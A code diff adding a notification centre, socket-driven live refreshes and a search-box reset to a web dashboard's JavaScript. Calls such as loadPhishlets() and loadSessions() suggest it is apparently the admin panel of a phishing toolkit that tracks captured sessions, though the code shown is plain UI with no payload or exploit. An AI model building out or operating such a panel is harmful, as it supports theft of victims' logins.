+    if(!_ncItems.length){list.innerHTML='<div class="nc-empty"><i class="fa-solid fa-bell-slash" style="font-size:32px;opacity:0.3;display:block;margin-bottom:12px"></i>No notifications yet</div>';return}
+    let h='';_ncItems.forEach(i=>{
+      h+='<div class="nc-item'+(i.read?'':' unread')+'" onclick="ncMarkRead('+i.id+')">';
+      h+='<div class="nc-item-head"><span class="nc-item-title"><span class="nc-item-icon '+(i.type||'info')+'"></span>'+esc(i.title||'')+'</span><span class="nc-item-time">'+_ncTimeAgo(i.ts)+'</span></div>';
+      h+='<div class="nc-item-msg">'+esc(i.message||'')+'</div></div>';
+    });
+    list.innerHTML=h;
+  }catch(e){}
+}
+async function ncMarkRead(id){
+  await api('/api/nc/read',{method:'POST',body:JSON.stringify({id})});
+  loadNcItems();
+}
+async function ncMarkAllRead(){
+  await api('/api/nc/read',{method:'POST',body:JSON.stringify({all:true})});
+  loadNcItems();
+}
+async function ncClearRead(){
+  await api('/api/nc/clear',{method:'POST'});
+  loadNcItems();
+}
+socket.on('nc_new',function(item){
+  const badge=$('#ncBadge');
+  let cur=parseInt(badge.textContent)||0;cur++;
+  badge.textContent=cur>99?'99+':cur;badge.style.display='flex';
+  badge.style.animation='none';badge.offsetHeight;badge.style.animation='bellShake 0.5s';
+  if($('#ncPanel').classList.contains('open'))loadNcItems();
+});
+let _liveDashT=null;
+socket.on('session_live',function(){
+  clearTimeout(_liveDashT);
+  _liveDashT=setTimeout(function(){
+    loadDashboard();
+    if($('#page-sessions') && $('#page-sessions').classList.contains('active')) loadSessions();
+  },200);
+});
+setInterval(loadNcItems,60000);
+loadNcItems();
+
 loadDashboard();loadPhishlets();
+resetSessSearch();
+(function(){
+  var n=0, t=setInterval(function(){
+    n++;
+    var el=$('#sessSearch');
+    if(el && document.activeElement!==el && el.value) el.value='';
+    if(n>25) clearInterval(t);
+  },100);
+})();
 try{if(localStorage.getItem('sb-closed')==='1' && window.innerWidth>768)$('.app').classList.add('sb-closed')}catch(e){}
 new MutationObserver(bindCardTables).observe(document.querySelector('.content'),{childList:true,subtree:true});
 bindCardTables();
